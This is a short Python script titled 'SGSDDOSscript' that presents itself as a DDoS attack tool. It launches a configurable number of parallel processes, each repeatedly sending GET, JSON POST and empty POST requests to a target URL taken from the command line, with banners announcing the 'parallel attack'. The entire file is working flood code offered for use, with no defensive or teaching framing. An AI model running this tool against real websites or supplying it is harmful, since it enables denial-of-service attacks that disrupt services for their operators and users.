#!/usr/bin/env python3
import requests
import time
from termcolor import colored
import sys
from multiprocessing import Process, freeze_support
import os

def get(url):
    try:
        response = requests.get(url, timeout=5)
        print(colored(f"[{os.getpid()}] GET → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] GET Error → {url}: {e}", "red"))

def post(url, datos):
    try:
        response = requests.post(url, json=datos, timeout=5)
        print(colored(f"[{os.getpid()}] POST → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] POST Error → {url}: {e}", "red"))

def post_without_data(url):
    try:
        response = requests.post(url, timeout=5)
        print(colored(f"[{os.getpid()}] POST (no data) → {url} - Status: {response.status_code}", "green"))
    except Exception as e:
        print(colored(f"[{os.getpid()}] POST (no data) Error → {url}: {e}", "red"))

def attack_worker(target_url, data, iterations=10):
    """Function that executes each worker process"""
    print(colored(f"[Process {os.getpid()}] Starting parallel attack...", "yellow"))
    
    for i in range(iterations):
        try:
            get(target_url)
            post(target_url, data)
            post_without_data(target_url)
            # Small pause to avoid saturating too quickly (adjustable)
            time.sleep(0.1)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(colored(f"[Process {os.getpid()}] Error in iteration {i}: {e}", "red"))
    
    print(colored(f"[Process {os.getpid()}] Worker finished after {iterations} iterations.", "yellow"))


if __name__ == "__main__":
    freeze_support()  # Necessary for Windows
    
    print(colored("=== SGSDDOSscript - DDoS Attack Script with Multiprocessing ===", "cyan"))
    
    if len(sys.argv) < 2:
        print(colored("Usage: python3 script.py <target_url> [num_processes] [iterations]", "yellow"))
        print(colored("Example: python3 script.py https://example.com 10 50", "yellow"))
        sys.exit(1)

    target_url = sys.argv[1]
    
    # Configurable parameters
    num_processes = int(sys.argv[2]) if len(sys.argv) > 2 else 8      # Default 8 processes
    iterations = int(sys.argv[3]) if len(sys.argv) > 3 else 30        # Iterations per process

    data = {
        "title": "hello",
        "body": "world",
        "userId": 1
    }

    print(colored(f"Target: {target_url}", "red"))
    print(colored(f"Parallel processes: {num_processes}", "magenta"))
    print(colored(f"Iterations per process: {iterations}", "magenta"))
    print(colored(f"Approximate total requests: {num_processes * iterations * 3}", "red"))
    print(colored("-" * 70, "cyan"))

    # Create the processes
    processes = []
    
    for i in range(num_processes):
        p = Process(
            target=attack_worker,
            args=(target_url, data, iterations),
            name=f"Worker-{i+1}"
        )
        processes.append(p)
        p.start()
        print(colored(f"→ Started process {i+1}/{num_processes} (PID: {p.pid})", "blue"))

    print(colored("\n¡Parallel attack started! Press Ctrl+C to stop.", "red"))

    try:
        for p in processes:
            p.join()  # Wait for all processes to finish
    except KeyboardInterrupt:
        print(colored("\n[!] Stopping all processes...", "yellow"))
        for p in processes:
            if p.is_alive():
                p.terminate()
        print(colored("[!] Attack stopped by user.", "yellow"))

    print(colored("=== Attack finished ===", "cyan"))